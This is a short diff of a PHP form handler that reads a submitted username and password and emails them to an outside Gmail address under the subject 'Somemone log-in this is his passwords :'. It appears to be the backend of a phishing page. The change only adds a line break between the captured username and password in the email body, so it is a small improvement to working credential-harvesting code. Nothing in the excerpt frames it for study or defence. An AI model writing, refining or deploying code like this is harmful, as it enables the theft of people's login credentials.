@@ -7,7 +7,7 @@ $passcode = $_POST['pass'] ?? '';    // Fetch password (using null coalescing op
 $subject = "Somemone log-in this is his passwords :";
 $to = "farenfiregames@gmail.com";
 
-$txt = "Username: " . $username . "Password: " . $passcode; // Email body (i) username [break] (ii) password;
+$txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body (i) username [break] (ii) password;
 
 // Check input fields
 if (!empty($username) and !empty($passcode)) {
